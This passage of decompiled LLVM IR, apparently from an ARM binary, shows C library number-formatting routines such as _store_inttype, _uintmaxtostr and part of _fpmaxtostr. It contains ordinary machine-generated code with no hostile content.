dec_label_pc_1bdcc:                               ; preds = %dec_label_pc_1bd98, %dec_label_pc_1bdc4
  %v0_1bdcc = load i32, i32* @r1, align 4
  %v1_1bdcc = inttoptr i32 %v0_1bdcc to i32*
  %v2_1bdcc = load i32, i32* %v1_1bdcc, align 4
  %v3_1bdcc = add i32 %v0_1bdcc, 4
  %v4_1bdcc = inttoptr i32 %v3_1bdcc to i32*
  %v5_1bdcc = load i32, i32* %v4_1bdcc, align 4
  store i32 %v5_1bdcc, i32* @r1, align 4
  ret i32 %v2_1bdcc

dec_label_pc_1bdd4:                               ; preds = %dec_label_pc_1bdc4
  %v7_1bdd4 = icmp eq i32 %v0_1bd8c, 256
  %v0_1bdd8 = load i32, i32* @r1, align 4
  %v1_1bdd8 = inttoptr i32 %v0_1bdd8 to i32*
  %v2_1bdd8 = load i32, i32* %v1_1bdd8, align 4
  br i1 %v7_1bdd4, label %.thread1, label %dec_label_pc_1bde8

.thread1:                                         ; preds = %dec_label_pc_1bdd4
  %v4_1bddc = mul i32 %v2_1bdd8, 16777216
  %v4_1bde0 = sdiv i32 %v4_1bddc, 16777216
  br label %.thread3

dec_label_pc_1bde8:                               ; preds = %dec_label_pc_1bdd4
  %v7_1bde8 = icmp eq i32 %v0_1bd8c, 512
  br i1 %v7_1bde8, label %bb9, label %.thread3

bb9:                                              ; preds = %dec_label_pc_1bde8
  %v4_1bdec = mul i32 %v2_1bdd8, 65536
  %v4_1bdf0 = sdiv i32 %v4_1bdec, 65536
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %dec_label_pc_1bde8, %bb9
  %v0_1bdf4 = phi i32 [ %v2_1bdd8, %dec_label_pc_1bde8 ], [ %v4_1bde0, %.thread1 ], [ %v4_1bdf0, %bb9 ]
  %v3_1bdf4 = ashr i32 %v0_1bdf4, 31
  store i32 %v3_1bdf4, i32* @r1, align 4
  ret i32 %v0_1bdf4

; uselistorder directives
  uselistorder i32 %v0_1bdf4, { 1, 0 }
  uselistorder i32 %v2_1bdd8, { 2, 0, 1 }
  uselistorder i32 %v2_1bda8, { 1, 0 }
  uselistorder i32 %v2_1bda4, { 1, 2, 0 }
  uselistorder i1 %v2_1bdc4, { 1, 0 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1bdcc, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_1bdfc = icmp eq i32 %arg2, 256
  store i1 %v7_1bdfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1bdfc, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_1be00 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_1be00, i8* %tmp3, align 1
  %v1_1be04.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_1be04 = phi i1 [ false, %entry ], [ %v1_1be04.pre, %bb ]
  %v0_1be04 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1be04, i32 %v0_1be04)
  %v7_1be08 = icmp eq i32 %arg2, 2048
  store i1 %v7_1be08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1be08, label %dec_label_pc_1be10, label %dec_label_pc_1be18

dec_label_pc_1be10:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_1be10 = add i32 %tmp2, 4
  %v6_1be10 = inttoptr i32 %v5_1be10 to i32*
  store i32 %arg4, i32* %v6_1be10, align 4
  ret i32 %tmp2

dec_label_pc_1be18:                               ; preds = %bb4
  %v7_1be18 = icmp eq i32 %arg2, 512
  store i1 %v7_1be18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1be18, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_1be18
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_1be18
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_1be34 = icmp slt i32 %tmp21, 0
  %v2_1be34 = icmp eq i32 %tmp21, 0
  store i1 %v2_1be34, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_1be3c = load i32, i32* @r2, align 4
  store i32 %v0_1be3c, i32* %r5.global-to-local, align 4
  %v0_1be40 = load i32, i32* @r3, align 4
  store i32 %v0_1be40, i32* %r6.global-to-local, align 4
  br i1 %v1_1be34, label %dec_label_pc_1be48, label %dec_label_pc_1be68

dec_label_pc_1be48:                               ; preds = %entry
  %v1_1be48 = icmp slt i32 %v0_1be40, 0
  %v2_1be48 = icmp eq i32 %v0_1be40, 0
  store i1 %v2_1be48, i1* %cpsr_z.global-to-local, align 1
  %v1_1be4c = sub i32 0, %tmp21
  store i32 %v1_1be4c, i32* %r7.global-to-local, align 4
  br i1 %v1_1be48, label %dec_label_pc_1be54, label %dec_label_pc_1be68

dec_label_pc_1be54:                               ; preds = %dec_label_pc_1be48
  %v1_1be58 = sub i32 0, %v0_1be3c
  store i32 %v1_1be58, i32* %r5.global-to-local, align 4
  %v2_1be58 = icmp eq i32 %v0_1be3c, 0
  %v2_1be5c = icmp eq i1 %v2_1be58, false
  %v5_1be5c = sext i1 %v2_1be5c to i32
  %v6_1be5c = sub i32 %v5_1be5c, %v0_1be40
  store i32 %v6_1be5c, i32* %r6.global-to-local, align 4
  %v19_1be5c = icmp eq i32 %v6_1be5c, 0
  store i1 %v19_1be5c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1be70

dec_label_pc_1be68:                               ; preds = %dec_label_pc_1be48, %entry
  br label %dec_label_pc_1be70

dec_label_pc_1be70:                               ; preds = %dec_label_pc_1be54, %dec_label_pc_1be68
  %storemerge = phi i8 [ 0, %dec_label_pc_1be68 ], [ 1, %dec_label_pc_1be54 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_1be78 = load i32, i32* %r7.global-to-local, align 4
  %v2_1be80 = udiv i32 -1, %v0_1be78
  store i32 %v2_1be80, i32* %fp.global-to-local, align 4
  %v3_1be90 = urem i32 -1, %v0_1be78
  %v1_1be94 = add i32 %v3_1be90, 1
  store i32 %v1_1be94, i32* %sb.global-to-local, align 4
  %v9_1be98 = icmp eq i32 %v1_1be94, %v0_1be78
  store i1 %v9_1be98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1be98, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1be70
  %v1_1be9c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_1be9c, i32* %sb.global-to-local, align 4
  %v2_1bea0 = add i32 %v2_1be80, 1
  store i32 %v2_1bea0, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1be70, %bb
  %v0_1bea4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1bea4, i32* %sl.global-to-local, align 4
  %v0_1bea8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1bea8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1beac

dec_label_pc_1beacthread-pre-split:               ; preds = %bb25
  %v0_1beac.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_1beb0.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1beb4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1beac

dec_label_pc_1beac:                               ; preds = %dec_label_pc_1beacthread-pre-split, %.thread
  %v0_1bf30 = phi i32 [ %v0_1beb4.pre, %dec_label_pc_1beacthread-pre-split ], [ %v0_1be78, %.thread ]
  %v0_1bf28 = phi i32 [ %v0_1beb0.pre, %dec_label_pc_1beacthread-pre-split ], [ %v0_1bea8, %.thread ]
  %v0_1bec4 = phi i32 [ %v0_1beac.pr, %dec_label_pc_1beacthread-pre-split ], [ %v0_1bea4, %.thread ]
  %v2_1beac = icmp eq i32 %v0_1bec4, 0
  store i1 %v2_1beac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1beac, label %dec_label_pc_1bf24, label %dec_label_pc_1bebc

dec_label_pc_1bebc:                               ; preds = %dec_label_pc_1beac
  %v2_1bec0 = udiv i32 %v0_1bec4, %v0_1bf30
  %v3_1bec0 = urem i32 %v0_1bec4, %v0_1bf30
  store i32 %v2_1bec0, i32* %sl.global-to-local, align 4
  %v2_1bee0 = udiv i32 %v0_1bf28, %v0_1bf30
  %v3_1bee0 = urem i32 %v0_1bf28, %v0_1bf30
  %v0_1bee4 = load i32, i32* %sb.global-to-local, align 4
  %v2_1bee4 = mul i32 %v0_1bee4, %v3_1bec0
  %v2_1beec = add i32 %v2_1bee4, %v3_1bee0
  store i32 %v2_1beec, i32* %r5.global-to-local, align 4
  %v0_1bef8 = load i32, i32* %fp.global-to-local, align 4
  %v2_1bef8 = mul i32 %v0_1bef8, %v3_1bec0
  %v2_1bf00 = add i32 %v2_1bef8, %v2_1bee0
  %v2_1bf08 = udiv i32 %v2_1beec, %v0_1bf30
  %v2_1bf10 = add i32 %v2_1bf00, %v2_1bf08
  br label %dec_label_pc_1bf3c

dec_label_pc_1bf24:                               ; preds = %dec_label_pc_1beac
  %v2_1bf24 = udiv i32 %v0_1bf28, %v0_1bf30
  br label %dec_label_pc_1bf3c

dec_label_pc_1bf3c:                               ; preds = %dec_label_pc_1bebc, %dec_label_pc_1bf24
  %storemerge28 = phi i32 [ %v2_1bf24, %dec_label_pc_1bf24 ], [ %v2_1bf10, %dec_label_pc_1bebc ]
  %v0_1bf58 = phi i32 [ %v2_1bf24, %dec_label_pc_1bf24 ], [ %v2_1bf10, %dec_label_pc_1bebc ]
  %v1_1bf58 = phi i32 [ 0, %dec_label_pc_1bf24 ], [ %v2_1bec0, %dec_label_pc_1bebc ]
  %v2_1beec.pn = phi i32 [ %v0_1bf28, %dec_label_pc_1bf24 ], [ %v2_1beec, %dec_label_pc_1bebc ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_1bf44 = urem i32 %v2_1beec.pn, %v0_1bf30
  %v2_1bf40 = icmp ugt i32 %v0_1bf44, 8
  %v7_1bf40 = icmp eq i32 %v0_1bf44, 9
  store i1 %v7_1bf40, i1* %cpsr_z.global-to-local, align 1
  %v1_1bf48 = add i32 %v0_1bf44, 48
  %v0_1bf50 = load i32, i32* %r8.global-to-local, align 4
  %v1_1bf50 = add i32 %v0_1bf50, -1
  store i32 %v1_1bf50, i32* %r8.global-to-local, align 4
  %v2_1bf54 = xor i1 %v7_1bf40, true
  %v3_1bf54 = and i1 %v2_1bf40, %v2_1bf54
  %extract.t = trunc i32 %v1_1bf48 to i8
  br i1 %v3_1bf54, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_1bf3c
  %v2_1bf44 = add i32 %v0_1bf44, %tmp11
  %extract.t9 = trunc i32 %v2_1bf44 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_1bf3c, %bb24
  %v0_1bf5c.off0 = phi i8 [ %extract.t, %dec_label_pc_1bf3c ], [ %extract.t9, %bb24 ]
  %v2_1bf58 = or i32 %v0_1bf58, %v1_1bf58
  %v4_1bf58 = icmp eq i32 %v2_1bf58, 0
  store i1 %v4_1bf58, i1* %cpsr_z.global-to-local, align 1
  %v3_1bf5c = inttoptr i32 %v1_1bf50 to i8*
  store i8 %v0_1bf5c.off0, i8* %v3_1bf5c, align 1
  %v0_1bf60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1bf60, label %dec_label_pc_1bf64, label %dec_label_pc_1beacthread-pre-split

dec_label_pc_1bf64:                               ; preds = %bb25
  %v4_1bf6410 = zext i8 %storemerge to i32
  store i32 %v4_1bf6410, i32* @r3, align 4
  %v2_1bf68 = icmp eq i8 %storemerge, 0
  store i1 %v2_1bf68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bf68, label %dec_label_pc_1bf64..thread2_crit_edge, label %bb26

dec_label_pc_1bf64..thread2_crit_edge:            ; preds = %dec_label_pc_1bf64
  %v0_1bf74.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_1bf64
  store i32 45, i32* @r3, align 4
  %v3_1bf70 = load i32, i32* %r8.global-to-local, align 4
  %v4_1bf70 = add i32 %v3_1bf70, -1
  %v5_1bf70 = inttoptr i32 %v4_1bf70 to i8*
  store i8 45, i8* %v5_1bf70, align 1
  %v6_1bf70 = load i32, i32* %r8.global-to-local, align 4
  %v7_1bf70 = add i32 %v6_1bf70, -1
  store i32 %v7_1bf70, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1bf64..thread2_crit_edge, %bb26
  %v0_1bf74 = phi i32 [ %v0_1bf74.pre, %dec_label_pc_1bf64..thread2_crit_edge ], [ %v7_1bf70, %bb26 ]
  ret i32 %v0_1bf74

; uselistorder directives
  uselistorder i32 %v0_1bf44, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1bf30, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_1be3c, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_1bf3c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1be70, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_1bf84 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_1bf90 = add i32 %arg4, 8
  %v2_1bf90 = inttoptr i32 %v1_1bf90 to i8*
  %v3_1bf90 = load i8, i8* %v2_1bf90, align 1
  %v4_1bf90 = zext i8 %v3_1bf90 to i32
  store i32 %v4_1bf90, i32* %sb.global-to-local, align 4
  %v1_1bf94 = or i32 %v4_1bf90, 32
  %v7_1bf98 = icmp eq i32 %v1_1bf94, 97
  store i1 %v7_1bf98, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_1bfb0 = inttoptr i32 %arg4 to i32*
  %v2_1bfb0 = load i32, i32* %v1_1bfb0, align 4
  store i32 %v2_1bfb0, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_1bfb8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1bfb8, i32* %r6.global-to-local, align 4
  store i32 90176, i32* %ip.global-to-local, align 4
  br i1 %v7_1bf98, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_1bfc0 = add nuw nsw i32 %v4_1bf90, 6
  store i32 %v2_1bfc0, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_1bfd0 = phi i32 [ %v0_1bfb8, %entry ], [ %v2_1bfc0, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_1bfc8 = add i32 %arg4, 12
  %v2_1bfc8 = inttoptr i32 %v1_1bfc8 to i32*
  %v3_1bfc8 = load i32, i32* %v2_1bfc8, align 4
  store i32 %v3_1bfc8, i32* %r2.global-to-local, align 4
  %v1_1bfcc = add i32 %arg4, 4
  %v2_1bfcc = inttoptr i32 %v1_1bfcc to i32*
  %v3_1bfcc = load i32, i32* %v2_1bfcc, align 4
  store i32 %v3_1bfcc, i32* @lr, align 4
  br i1 %v7_1bf98, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_1bfd0 = urem i32 %v1_1bfd0, 256
  store i32 %v2_1bfd0, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_1bfd4 = icmp slt i32 %v2_1bfb0, 0
  %v2_1bfd4 = icmp eq i32 %v2_1bfb0, 0
  store i1 %v2_1bfd4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_1bfd4, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_1bfe4 = and i32 %v3_1bfc8, 2
  %v2_1bfe4 = icmp eq i32 %v1_1bfe4, 0
  store i1 %v2_1bfe4, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_1bfe4, label %dec_label_pc_1bffc, label %dec_label_pc_1c008

dec_label_pc_1bffc:                               ; preds = %bb205
  %v1_1bffc = urem i32 %v3_1bfc8, 2
  %v2_1bffc = icmp eq i32 %v1_1bffc, 0
  store i1 %v2_1bffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bffc, label %dec_label_pc_1c00c, label %dec_label_pc_1c008

dec_label_pc_1c008:                               ; preds = %dec_label_pc_1bffc, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_1bffc ]
  %v0_1c008.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_1bffc ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_1c008.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_1c00c

dec_label_pc_1c00c:                               ; preds = %dec_label_pc_1bffc, %dec_label_pc_1c008
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_1bfb8, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_1bfb8, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_1c028 = fptrunc double %arg2 to float
  %v2_1c028 = bitcast float %v1_1c028 to i32
  %v9_1c028 = call i32 @__aeabi_dcmpeq(i32 %v2_1c028, i32 %v0_1bfb8, i32 %v2_1c028, i32 %v0_1bfb8, i32 0)
  store i32 %v9_1c028, i32* %r0.global-to-local, align 4
  %v2_1c02c = icmp eq i32 %v9_1c028, 0
  store i1 %v2_1c02c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c02c, label %bb207, label %dec_label_pc_1c03c

bb207:                                            ; preds = %dec_label_pc_1c00c
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c0f0

dec_label_pc_1c03c:                               ; preds = %dec_label_pc_1c00c
  %v0_1c03c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1c03c, i32* @r0, align 4
  %v0_1c040 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1c040, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1c04c = call i32 @__aeabi_dcmpeq(i32 %v0_1c03c, i32 %v0_1c040, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1c04c, i32* %r0.global-to-local, align 4
  %v2_1c050 = icmp eq i32 %v7_1c04c, 0
  store i1 %v2_1c050, i1* %cpsr_z.global-to-local, align 1
  %v0_1c098 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c098 = sext i32 %v0_1c098 to i64
  %v2_1c098 = bitcast i64 %v1_1c098 to double
  br i1 %v2_1c050, label %dec_label_pc_1c098, label %dec_label_pc_1c058

dec_label_pc_1c058:                               ; preds = %dec_label_pc_1c03c
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_1c068 = fdiv double 0.000000e+00, %v2_1c098
  %v10_1c068 = fptrunc double %v9_1c068 to float
  %v11_1c068 = bitcast float %v10_1c068 to i32
  store i32 %v11_1c068, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1c074 = call i32 @__aeabi_dcmplt(i32 %v11_1c068, i32 1072693248, i32 0, i32 0)
  store i32 %v4_1c074, i32* %r0.global-to-local, align 4
  %v2_1c078 = icmp eq i32 %v4_1c074, 0
  store i1 %v2_1c078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c078, label %bb208, label %dec_label_pc_1c084

bb208:                                            ; preds = %dec_label_pc_1c058
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c264

dec_label_pc_1c084:                               ; preds = %dec_label_pc_1c058
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_1c264

dec_label_pc_1c098:                               ; preds = %dec_label_pc_1c03c
  store i32 %v0_1c098, i32* @r0, align 4
  %v0_1c09c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1c09c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1c0a8 = fptrunc double %v2_1c098 to float
  %v2_1c0a8 = bitcast float %v1_1c0a8 to i32
  %v6_1c0a8 = call i32 @__aeabi_dcmplt(i32 %v2_1c0a8, i32 %v0_1c09c, i32 0, i32 0)
  store i32 %v6_1c0a8, i32* %r0.global-to-local, align 4
  %v2_1c0ac = icmp eq i32 %v6_1c0a8, 0
  store i1 %v2_1c0ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c0ac, label %dec_label_pc_1c098..thread9_crit_edge, label %bb209

dec_label_pc_1c098..thread9_crit_edge:            ; preds = %dec_label_pc_1c098
  %v0_1c0cc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_1c098
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_1c0b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c0b4 = sub i32 0, %v1_1c0b4
  store i32 %v2_1c0b4, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_1c0b4, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1c098..thread9_crit_edge, %bb209
  %v0_1c0cc = phi i32 [ %v0_1c0cc.pre, %dec_label_pc_1c098..thread9_crit_edge ], [ %v2_1c0b4, %bb209 ]
  %v0_1c0c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c0c8 = sext i32 %v0_1c0c8 to i64
  %v2_1c0c8 = bitcast i64 %v1_1c0c8 to double
  %v9_1c0d0 = fmul double %v2_1c0c8, 0.000000e+00
  %v10_1c0d0 = fptrunc double %v9_1c0d0 to float
  %v11_1c0d0 = bitcast float %v10_1c0d0 to i32
  store i32 %v11_1c0d0, i32* @r2, align 4
  store i32 %v0_1c0cc, i32* %r3.global-to-local, align 4
  store i32 %v0_1c0c8, i32* @r0, align 4
  store i32 %v0_1c0cc, i32* %r1.global-to-local, align 4
  %v7_1c0e4 = call i32 @__aeabi_dcmpeq(i32 %v0_1c0c8, i32 %v0_1c0cc, i32 %v11_1c0d0, i32 %v0_1c0cc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1c0e4, i32* %r0.global-to-local, align 4
  %v2_1c0e8 = icmp eq i32 %v7_1c0e4, 0
  store i1 %v2_1c0e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c0e8, label %dec_label_pc_1c13c, label %.thread9.dec_label_pc_1c0f0_crit_edge

.thread9.dec_label_pc_1c0f0_crit_edge:            ; preds = %.thread9
  %v3_1c0f0.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_1c0f0

dec_label_pc_1c0f0:                               ; preds = %bb207, %.thread9.dec_label_pc_1c0f0_crit_edge
  %v3_1c0f0 = phi i32 [ %v3_1c0f0.pre, %.thread9.dec_label_pc_1c0f0_crit_edge ], [ %arg4, %bb207 ]
  %v1_1c034.v0_1c0205 = phi i32 [ 0, %.thread9.dec_label_pc_1c0f0_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_1c0f0, i32* %ip.global-to-local, align 4
  %v2_1c0f8 = add i32 %v3_1c0f0, 16
  %v3_1c0f8 = inttoptr i32 %v2_1c0f8 to i32*
  store i32 32, i32* %v3_1c0f8, align 4
  %v0_1c100 = load i32, i32* %sb.global-to-local, align 4
  %v7_1c100 = icmp eq i32 %v0_1c100, 96
  store i1 %v7_1c100, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_1c100, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_1c0f0
  %v5_1c114 = or i32 %v1_1c034.v0_1c0205, 4
  store i32 %v5_1c114, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_1c0f0, %bb210
  %v4_1c118 = phi i32 [ %v5_1c114, %bb210 ], [ 3, %dec_label_pc_1c0f0 ]
  %v4_1c118.v1_1c034.v0_1c020 = select i1 %tmp274, i32 %v4_1c118, i32 %v1_1c034.v0_1c0205
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34764), i32* %r3.global-to-local, align 4
  %v2_1c12c = add i32 %v4_1c118.v1_1c034.v0_1c020, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34764)
  store i32 %v2_1c12c, i32* %r2.global-to-local, align 4
  %v2_1c130 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1c130, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1c658

dec_label_pc_1c13c:                               ; preds = %.thread9
  %v0_1c13c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1c13c, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_1c144 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1c144, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_1c14c = call i32 @__aeabi_dcmplt(i32 %v0_1c144, i32 %v0_1c13c, i32 0, i32 1100470148)
  store i32 %v6_1c14c, i32* %r0.global-to-local, align 4
  %v2_1c150 = icmp eq i32 %v6_1c14c, 0
  store i1 %v2_1c150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c150, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_1c13c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_1c13c, %bb211
